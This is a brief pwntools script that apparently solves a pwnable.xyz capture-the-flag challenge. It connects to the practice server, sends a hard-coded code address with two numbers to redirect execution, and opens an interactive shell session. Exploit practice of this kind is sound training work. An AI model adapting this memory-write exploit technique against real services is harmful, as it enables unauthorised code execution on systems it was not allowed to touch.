from pwn import *

# Connect to the remote server
p = remote('svc.pwnable.xyz', 30002)

address = int('400822',16)

p.recvuntil('Input: ')

p.send(str(address))
p.send(' 0 ')
p.sendline('13')

p.interactive()

# Send the payload



